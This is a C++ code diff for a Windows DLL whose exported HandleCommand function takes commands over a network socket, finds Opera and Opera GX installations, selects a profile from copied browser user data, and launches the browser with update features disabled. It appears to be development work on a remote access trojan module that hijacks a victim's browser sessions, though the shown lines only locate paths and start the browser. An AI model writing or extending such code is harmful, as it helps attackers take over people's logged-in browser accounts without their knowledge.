@@ -1311,6 +1311,40 @@ static wstring get_app_path(const wstring& appName) {
             RegCloseKey(hKey);
         }
     }
+
+    if (path.empty()) {
+        wchar_t szPath[MAX_PATH];
+        if (appName == L"opera.exe" || appName == L"launcher.exe") {
+            if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) == S_OK) {
+                wstring check = wstring(szPath) + L"\\Programs\\Opera\\launcher.exe";
+                if (fs::exists(check)) return check;
+            }
+            if (SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILES, NULL, 0, szPath) == S_OK) {
+                wstring check = wstring(szPath) + L"\\Opera\\launcher.exe";
+                if (fs::exists(check)) return check;
+                check = wstring(szPath) + L"\\Opera\\opera.exe";
+                if (fs::exists(check)) return check;
+            }
+        } else if (appName == L"operagx.exe") {
+            if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) == S_OK) {
+                wstring check = wstring(szPath) + L"\\Programs\\Opera GX\\launcher.exe";
+                if (fs::exists(check)) return check;
+            }
+            if (SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILES, NULL, 0, szPath) == S_OK) {
+                wstring check = wstring(szPath) + L"\\Opera GX\\launcher.exe";
+                if (fs::exists(check)) return check;
+            }
+        }
+    }
+
+    // Strip quotes if any
+    if (!path.empty() && path[0] == L'\"') {
+        size_t last = path.find_last_of(L'\"');
+        if (last != wstring::npos && last > 0) {
+            path = path.substr(1, last - 1);
+        }
+    }
+
     return path;
 }
 
@@ -1496,26 +1530,34 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     // İlk profili tespit et (Default veya Profile 1)
                     wstring profileDir = L"Default";
-                    if (wRequestedPath == L"Opera") profileDir = L"Opera Stable";
-                    else if (wRequestedPath == L"Opera GX") profileDir = L"Opera GX Stable";
+                    bool isOpera = (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX");
 
                     WIN32_FIND_DATAW findData;
                     HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
+                    bool foundProfile = false;
                     if (hFind != INVALID_HANDLE_VALUE) {
                         do {
                             wstring name = findData.cFileName;
                             if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                                if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
-                                    if (name == profileDir) break;
+                                if (isOpera) {
+                                    if (name == L"Opera Stable" || name == L"Opera GX Stable" || name == L"Default") {
+                                        profileDir = name;
+                                        foundProfile = true;
+                                        break;
+                                    }
                                 } else {
                                     if (name == L"Default" || name.find(L"Profile ") == 0) {
                                         profileDir = name;
+                                        foundProfile = true;
                                         break;
                                     }
                                 }
                             }
                         } while (FindNextFileW(hFind, &findData));
                         FindClose(hFind);
+                    }
+                    if (!foundProfile && isOpera) {
+                        profileDir = L"Default";
                     }
 
                     send_status("Tarayıcı başlatılıyor...");
@@ -1560,7 +1602,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         args += L" --disable-features=GXC_Check_UI_Updates,GXC_Auto_Update --no-custom-menu";
                     }
 
-                    wstring fullCmd = L"\"" + exePath + L"\"" + args;
+                    // Ensure exePath is properly quoted if it contains spaces
+                    wstring quotedExe = exePath;
+                    if (quotedExe.find(L' ') != wstring::npos && quotedExe[0] != L'\"') {
+                        quotedExe = L"\"" + quotedExe + L"\"";
+                    }
+
+                    wstring fullCmd = quotedExe + args;
                     vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
                     cmdLine.push_back(L'\0');
 
